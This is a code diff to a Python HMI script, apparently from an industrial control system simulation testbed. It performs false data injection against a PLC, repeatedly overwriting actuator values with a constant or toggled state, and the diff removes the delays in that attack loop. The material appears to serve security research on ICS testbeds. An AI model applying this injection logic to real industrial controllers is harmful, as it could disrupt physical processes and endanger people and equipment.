@@ -17,7 +17,7 @@ from datetime import datetime as dt
 ACTUATOR1 = ("ACTUATOR1-MV", 1)  # to be received from PLC1
 
 class FPHMI(HMI):
-    random = None
+    
     def main_loop(self):
         """hmi main loop.
         - monitor PLC1 tag (actuator1)
@@ -38,6 +38,7 @@ class FPHMI(HMI):
         delay = 60 * int(sys.argv[1]) # delay in seconds
         close_time = time.time() + delay
         while close_time > time.time():
+            random = None
             motor_status = int(self.get(ACTUATOR1))
 
             """"We basically changing the actuator value to the opposite -- old school command line injection"""
@@ -52,7 +53,7 @@ class FPHMI(HMI):
                 print("Attacking PLC1 with false data injection constant value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                time.sleep(0.5)
+                # time.sleep(0.5)
                 logging.info("FDI Constant: Actuator status changed to: %s" % toggle_status)
             else:
                 toggle_status = int(not motor_status)
@@ -60,7 +61,7 @@ class FPHMI(HMI):
                 print("Attacking PLC1 with false data injection not value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                time.sleep(0.5)
+                # time.sleep(0.5)
                 logging.info("FDI toggle: Actuator status changed to %s" % toggle_status)
 
 
